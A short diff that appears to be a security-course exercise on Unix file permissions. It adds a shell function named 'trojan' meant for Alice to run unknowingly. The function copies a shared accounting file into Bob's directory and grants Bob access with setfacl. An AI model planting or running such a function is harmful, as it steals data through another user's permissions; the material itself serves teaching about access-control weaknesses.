@@ -1,0 +1,8 @@
+script:
+
+add function trojan to /shared_data/bob/fun and call the function, then make Alice run it
+
+trojan(){
+cp /shared_data/accounting.txt /shared_data/bob/trojan.txt
+setfacl -m u:bob:rwx /shared_data/bob/trojan.txt
+}
